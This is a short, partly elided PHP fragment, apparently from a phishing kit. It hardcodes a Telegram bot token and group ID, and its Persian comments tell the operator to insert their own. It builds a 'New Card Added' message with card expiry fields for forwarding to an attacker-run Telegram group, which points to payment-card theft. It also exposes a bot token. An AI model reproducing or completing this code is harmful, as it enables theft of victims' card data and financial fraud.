...
$protocol = $_SERVER['SERVER_PROTOCOL'];
    ...
    $token = "8304523498:AAGMMpkNCXRrDdVImy5joh2jSsVSrV6tR14"; //توکن ربات خود را در این قسمت وارد کنید
     $textmsg = "
 New Card Added 🍉 
➖➖➖➖➖➖➖
...
🔖 $sal:$mah
➖➖➖➖➖➖➖
🔅Channel Telegram : @Anonymous_TM1";

     $gpid = -1003101471344; //ایدی عددی گپ را در این قسمت وارد کنید
